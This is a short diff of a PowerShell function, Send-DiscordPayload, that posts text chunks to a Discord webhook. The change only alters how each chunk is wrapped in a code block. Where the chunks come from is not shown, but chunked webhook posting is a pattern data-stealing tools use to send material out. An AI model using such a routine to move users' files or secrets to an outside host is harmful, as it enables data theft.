@@ -102,7 +102,7 @@ function Send-DiscordPayload {
     }
 
     foreach ($chunk in $chunks) {
-        $jsonPayload = @{ content = "```powershell \n$chunk\n``` " } | ConvertTo-Json
+        $jsonPayload = @{ content = "```$chunk``` " } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhook_url -Method POST -Body $jsonPayload -ContentType "application/json"
         Start-Sleep -Seconds 1
     }
